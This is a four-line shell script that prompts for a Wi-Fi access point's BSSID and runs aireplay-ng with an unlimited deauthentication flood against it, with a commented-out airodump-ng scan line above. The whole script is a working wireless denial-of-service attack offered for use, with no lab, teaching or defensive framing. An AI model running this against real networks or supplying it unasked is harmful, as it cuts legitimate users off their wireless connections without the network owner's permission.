#sudo airodump-ng wlan0
echo "Enter bssid:"
read bssid
sudo aireplay-ng --deauth 0 -a $bssid wlan0
